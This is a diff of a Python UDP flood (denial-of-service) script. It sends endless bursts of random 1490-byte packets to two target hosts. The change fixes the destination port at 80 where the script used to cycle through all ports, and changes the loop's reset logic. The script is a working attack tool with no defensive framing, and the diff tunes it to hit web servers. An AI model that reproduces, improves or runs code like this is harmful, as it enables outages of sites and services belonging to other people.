@@ -28,11 +28,6 @@ sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 
-# Port selection.
-port_mode = False # If 'False' all ports will be use, if 'True' - certain.
-port = 1
-
-
 # Cast
 os.system(cmd_clear)
 print('\033[1;34mTo all of my children in whom Life flows abundant...')
@@ -85,15 +80,20 @@ timeR = i + random.randint(0,20)
 now = datetime.datetime.now()
 dtime = now.strftime("%Y-%m-%d %H:%M:%S")
 
+# Port selection.
+port_mode = False # If 'False' all ports will be use, if 'True' - certain.
+#port = 1
+port = 80
+
 #ululu alala
 if port_mode == False:  # All ports.
     try:
         while True:
-            if port == 65534:                
+            if sent == 65535:                
                 print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip1, port))
                 print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip2, port))
                 print('\033[1;36m/wait %s'%(timeR))
-                port = 1
+                #port = 1
                 time.sleep(timeR)
                 ip1 = socket.gethostbyname(url1)
                 ip2 = socket.gethostbyname(url2)
@@ -105,7 +105,7 @@ if port_mode == False:  # All ports.
             sock.sendto(bytes, (str(ip1), port))
             sock.sendto(bytes, (str(ip2), port))
             sent += 1
-            port += 1
+            #port += 1
             timeR = i + random.randint(0,20)
             now = datetime.datetime.now()
             dtime = now.strftime("%Y-%m-%d %H:%M:%S")
